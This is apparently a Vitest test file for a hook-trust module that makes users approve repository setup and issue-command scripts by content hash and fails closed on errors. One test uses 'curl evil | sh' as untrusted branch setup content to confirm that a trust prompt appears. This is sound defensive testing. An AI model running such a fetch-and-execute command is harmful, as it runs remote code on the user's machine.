import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { AppState } from '@/store/types'
import type { PersistedTrustedOrcaHooks } from '../../../shared/orca-yaml-hook-types'
import {
  __resetTrustPromptChainForTests,
  confirmCreatedWorktreeSetupContent,
  ensureHooksApproved,
  ensureHooksConfirmed,
  readAndConfirmRuntimeIssueCommand
} from './ensure-hooks-confirmed'
import { hashOrcaHookScript } from './orca-hook-trust'
import { createHash } from 'node:crypto'
import {
  createCompatibleRuntimeStatusResponseIfNeeded,
  type RuntimeEnvironmentCallRequest
} from '@/runtime/runtime-compatibility-test-fixture'
import { clearRuntimeCompatibilityCacheForTests } from '@/runtime/runtime-rpc-client'

const hooksCheckMock = vi.fn()
const readIssueCommandMock = vi.fn()
const runtimeEnvironmentCallMock = vi.fn()
const runtimeEnvironmentTransportCallMock = vi.fn()

function installHooksApiMock(): void {
  vi.stubGlobal('window', {
    api: {
      hooks: {
        check: hooksCheckMock,
        readIssueCommand: readIssueCommandMock
      },
      runtimeEnvironments: {
        call: runtimeEnvironmentTransportCallMock
      }
    }
  })
}

type PendingPrompt = {
  modal: string
  data: Record<string, unknown>
  resolve: (decision: 'run' | 'skip') => void
}

function createTestState(overrides?: Partial<AppState>): {
  state: AppState
  pending: PendingPrompt[]
} {
  const pending: PendingPrompt[] = []
  const trust: PersistedTrustedOrcaHooks = {}
  const state = {
    trustedOrcaHooks: trust,
    repos: [{ id: 'repo-1', displayName: 'Repo One' }],
    openModal: (modal: string, data: Record<string, unknown>) => {
      pending.push({ modal, data, resolve: data.onResolve as (d: 'run' | 'skip') => void })
    },
    ...overrides
  } as unknown as AppState
  return { state, pending }
}

describe('ensureHooksConfirmed', () => {
  beforeEach(() => {
    hooksCheckMock.mockReset()
    readIssueCommandMock.mockReset()
    runtimeEnvironmentCallMock.mockReset()
    runtimeEnvironmentTransportCallMock.mockReset()
    runtimeEnvironmentTransportCallMock.mockImplementation(
      (args: RuntimeEnvironmentCallRequest) => {
        return (
          createCompatibleRuntimeStatusResponseIfNeeded(args) ?? runtimeEnvironmentCallMock(args)
        )
      }
    )
    clearRuntimeCompatibilityCacheForTests()
    installHooksApiMock()
    __resetTrustPromptChainForTests()
  })

  it('short-circuits to run when the persisted content hash matches the current script', async () => {
    const { state, pending } = createTestState()
    const script = 'pnpm install'
    const hash = await hashOrcaHookScript(script)
    state.trustedOrcaHooks['repo-1'] = {
      setup: { contentHash: hash, approvedAt: 1 }
    }
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: script } },
      mayNeedUpdate: false
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')

    expect(decision).toBe('run')
    expect(pending).toHaveLength(0)
  })

  it('re-prompts when the script content differs from the persisted hash', async () => {
    const { state, pending } = createTestState()
    const staleHash = await hashOrcaHookScript('old script')
    state.trustedOrcaHooks['repo-1'] = {
      setup: { contentHash: staleHash, approvedAt: 1 }
    }
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: 'new script' } },
      mayNeedUpdate: false
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'setup')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('new script')
    // Explain re-prompting as changed orca.yaml, distinct from first-time approval.
    expect(pending[0].data.previouslyApproved).toBe(true)

    pending[0].resolve('run')
    await expect(promise).resolves.toBe('run')
  })

  it('includes default tab commands in the setup trust prompt', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: {
        scripts: { setup: 'pnpm install' },
        defaultTabs: [
          { title: 'Server', command: 'pnpm dev' },
          { title: 'Notes' },
          { command: 'codex' }
        ]
      },
      mayNeedUpdate: false
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'setup')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    const expectedContent =
      'pnpm install\n\n# defaultTabs[1] Server\npnpm dev\n\n# defaultTabs[3]\ncodex'
    expect(pending[0].data.scriptContent).toBe(expectedContent)
    expect(pending[0].data.contentHash).toBe(await hashOrcaHookScript(expectedContent))

    pending[0].resolve('skip')
    await expect(promise).resolves.toBe('skip')
  })

  it('checks SSH repo hooks through local IPC even when a runtime is focused', async () => {
    const { state, pending } = createTestState({
      settings: { activeRuntimeEnvironmentId: 'env-1' },
      repos: [
        {
          id: 'repo-1',
          displayName: 'Repo One',
          connectionId: 'ssh-1'
        }
      ]
    } as unknown as Partial<AppState>)
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: {} },
      mayNeedUpdate: false
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'archive')

    expect(decision).toBe('run')
    expect(hooksCheckMock).toHaveBeenCalledWith({ repoId: 'repo-1', hostId: 'ssh:ssh-1' })
    expect(pending).toHaveLength(0)
  })

  it('inspects the requested host when duplicate repo ids exist', async () => {
    const { state } = createTestState({
      settings: { activeRuntimeEnvironmentId: 'env-1' },
      trustedOrcaHooks: { 'repo-1': { all: { approvedAt: 1 } } },
      repos: [
        { id: 'repo-1', displayName: 'Runtime', executionHostId: 'runtime:env-1' },
        { id: 'repo-1', displayName: 'SSH', connectionId: 'ssh-1' }
      ]
    } as unknown as Partial<AppState>)
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: {} },
      mayNeedUpdate: false
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'archive', 'ssh:ssh-1')

    expect(decision).toBe('run')
    expect(hooksCheckMock).toHaveBeenCalledWith({ repoId: 'repo-1', hostId: 'ssh:ssh-1' })
    expect(runtimeEnvironmentCallMock).not.toHaveBeenCalled()
  })

  it('refuses to pick a host when the repo id is on two hosts and none is given', async () => {
    const { state, pending } = createTestState()
    Object.assign(state, {
      repos: [
        { id: 'repo-1', displayName: 'Runtime', executionHostId: 'runtime:env-1' },
        { id: 'repo-1', displayName: 'Local', executionHostId: 'local' }
      ]
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')

    expect(decision).toBe('skip')
    expect(hooksCheckMock).not.toHaveBeenCalled()
    expect(runtimeEnvironmentCallMock).not.toHaveBeenCalled()
    expect(pending).toHaveLength(0)
  })

  it('checks runtime-owned repo hooks through the repo owner runtime', async () => {
    const { state, pending } = createTestState({
      settings: { activeRuntimeEnvironmentId: 'focused-env' },
      repos: [
        {
          id: 'repo-1',
          displayName: 'Repo One',
          executionHostId: 'runtime:owner-env'
        }
      ]
    } as unknown as Partial<AppState>)
    runtimeEnvironmentCallMock.mockResolvedValue({
      id: 'rpc-hooks',
      ok: true,
      result: {
        hasHooks: true,
        hooks: { scripts: {} },
        mayNeedUpdate: false
      },
      _meta: { runtimeId: 'runtime-owner' }
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'archive')

    expect(decision).toBe('run')
    expect(runtimeEnvironmentCallMock).toHaveBeenCalledWith({
      selector: 'owner-env',
      method: 'repo.hooksCheck',
      params: { repo: 'repo-1', wakeWslDistro: true },
      timeoutMs: 15_000
    })
    expect(hooksCheckMock).not.toHaveBeenCalled()
    expect(pending).toHaveLength(0)
  })

  it('still honors local issueCommand overrides when shared inspection reports an error', async () => {
    const { state, pending } = createTestState()
    readIssueCommandMock.mockResolvedValue({
      status: 'error',
      source: 'local',
      localUntracked: true,
      sharedContent: null,
      localContent: 'user content',
      effectiveContent: 'user content',
      localFilePath: ''
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'issueCommand')

    expect(decision).toBe('run')
    expect(pending).toHaveLength(0)
  })

  it('asks before running a local issue command not proven untracked', async () => {
    const { state, pending } = createTestState()
    readIssueCommandMock.mockResolvedValue({
      status: 'ok',
      source: 'local',
      sharedContent: null,
      localContent: 'committed content',
      effectiveContent: 'committed content',
      localFilePath: ''
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'issueCommand')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('committed content')
    pending[0].resolve('skip')
    await expect(promise).resolves.toBe('skip')
  })

  it('approves and returns the exact issue-command bytes from one host-qualified read', async () => {
    const { state, pending } = createTestState({
      repos: [
        { id: 'repo-1', displayName: 'Local Row' },
        { id: 'repo-1', displayName: 'SSH Row', connectionId: 'server' }
      ]
    } as unknown as Partial<AppState>)
    readIssueCommandMock
      .mockResolvedValueOnce({
        status: 'ok',
        source: 'shared',
        sharedContent: 'approved bytes',
        localContent: null,
        effectiveContent: 'approved bytes',
        localFilePath: ''
      })
      .mockResolvedValueOnce({
        status: 'ok',
        source: 'shared',
        sharedContent: 'changed bytes',
        localContent: null,
        effectiveContent: 'changed bytes',
        localFilePath: ''
      })

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'ssh:server')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('approved bytes')
    pending[0].resolve('run')

    await expect(promise).resolves.toMatchObject({
      template: 'approved bytes',
      trustDecision: 'run'
    })
    expect(readIssueCommandMock).toHaveBeenCalledTimes(1)
    expect(readIssueCommandMock).toHaveBeenCalledWith({
      repoId: 'repo-1',
      hostId: 'ssh:server',
      wakeWslDistro: true
    })
  })

  it('does not reuse repo-wide trust across duplicate execution hosts', async () => {
    const { state, pending } = createTestState({
      trustedOrcaHooks: { 'repo-1': { all: { approvedAt: 1 } } },
      repos: [
        { id: 'repo-1', displayName: 'Runtime', executionHostId: 'runtime:env-1' },
        { id: 'repo-1', displayName: 'SSH', connectionId: 'server' }
      ]
    } as unknown as Partial<AppState>)
    readIssueCommandMock.mockResolvedValue({
      status: 'ok',
      source: 'shared',
      sharedContent: 'host-specific bytes',
      localContent: null,
      effectiveContent: 'host-specific bytes',
      localFilePath: ''
    })

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'ssh:server')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    pending[0].resolve('skip')
    await expect(promise).resolves.toMatchObject({ trustDecision: 'skip' })
  })

  it('does not open a trust prompt after its composer is cancelled mid-read', async () => {
    const { state, pending } = createTestState()
    let cancelled = false
    let resolveRead: (result: Record<string, unknown>) => void = () => undefined
    readIssueCommandMock.mockImplementation(
      () =>
        new Promise((resolve) => {
          resolveRead = resolve
        })
    )

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'local', () => cancelled)
    cancelled = true
    resolveRead({
      status: 'ok',
      source: 'shared',
      sharedContent: 'late bytes',
      localContent: null,
      effectiveContent: 'late bytes',
      localFilePath: ''
    })

    await expect(promise).resolves.toMatchObject({ trustDecision: 'skip' })
    expect(pending).toHaveLength(0)
  })

  it('fails closed when issueCommand inspection reports an error status', async () => {
    const { state, pending } = createTestState()
    readIssueCommandMock.mockResolvedValue({
      status: 'error',
      source: 'none',
      sharedContent: null,
      localContent: null,
      effectiveContent: null,
      localFilePath: ''
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'issueCommand')

    expect(decision).toBe('skip')
    expect(pending).toHaveLength(0)
  })

  it('serializes overlapping prompts so a second call waits for the first to resolve', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: 'pnpm install', archive: 'echo bye' } },
      mayNeedUpdate: false
    })

    const first = ensureHooksConfirmed(state, 'repo-1', 'setup')
    const second = ensureHooksConfirmed(state, 'repo-1', 'archive')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptKind).toBe('setup')

    pending[0].resolve('skip')
    await expect(first).resolves.toBe('skip')

    await vi.waitFor(() => expect(pending).toHaveLength(2))
    expect(pending[1].data.scriptKind).toBe('archive')

    pending[1].resolve('run')
    await expect(second).resolves.toBe('run')
  })

  it('lets a queued prompt for the same script see the approval recorded by the one before it', async () => {
    const created = createTestState()
    const { pending } = created
    let state = created.state
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { archive: 'echo bye' } },
      mayNeedUpdate: false
    })

    const first = ensureHooksConfirmed(() => state, 'repo-1', 'archive')
    const second = ensureHooksConfirmed(() => state, 'repo-1', 'archive')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    // The store replaces its state when the dialog records trust, as zustand does.
    state = {
      ...state,
      trustedOrcaHooks: {
        'repo-1': {
          archive: { contentHash: await hashOrcaHookScript('echo bye'), approvedAt: 1 }
        }
      }
    }
    pending[0].resolve('run')

    await expect(first).resolves.toBe('run')
    await expect(second).resolves.toBe('run')
    expect(pending).toHaveLength(1)
  })

  it('fails closed when window.api.hooks.check throws', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockRejectedValue(new Error('boom'))

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')

    expect(decision).toBe('skip')
    expect(pending).toHaveLength(0)
  })

  it('fails closed when hook inspection reports an error status', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      status: 'error',
      hasHooks: false,
      hooks: null,
      mayNeedUpdate: false
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')

    expect(decision).toBe('skip')
    expect(pending).toHaveLength(0)
  })

  it('returns the approved setup hash the host recomputes with node crypto', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: 'pnpm install' } },
      mayNeedUpdate: false
    })

    const promise = ensureHooksApproved(state, 'repo-1', 'setup')
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    pending[0].resolve('run')

    await expect(promise).resolves.toEqual({
      decision: 'run',
      approvedContentHash: createHash('sha256').update('pnpm install').digest('hex')
    })
  })

  it('approves the empty setup content without prompting so a branch cannot add unseen scripts', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({ hasHooks: false, hooks: null, mayNeedUpdate: false })

    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
      decision: 'run',
      approvedContentHash: await hashOrcaHookScript('')
    })
    expect(pending).toHaveLength(0)
  })

  it('sends no hash when the whole repo is trusted, so any branch content runs as before', async () => {
    const { state } = createTestState()
    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }

    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
      decision: 'run'
    })
  })

  it('re-prompts with the created branch setup content that differs', async () => {
    const { state, pending } = createTestState()

    const promise = confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'curl evil | sh')
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('curl evil | sh')
    expect(pending[0].data.scriptKind).toBe('setup')
    expect(pending[0].data.skippedSetupReview).toBe('created-branch')
    pending[0].resolve('skip')

    await expect(promise).resolves.toEqual({ decision: 'skip' })
  })

  it('returns the created branch content hash under repo-wide trust so the host can run it', async () => {
    const { state, pending } = createTestState()
    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }

    await expect(
      confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'pnpm build')
    ).resolves.toEqual({
      decision: 'run',
      approvedContentHash: createHash('sha256').update('pnpm build').digest('hex')
    })
    expect(pending).toHaveLength(0)
  })
})
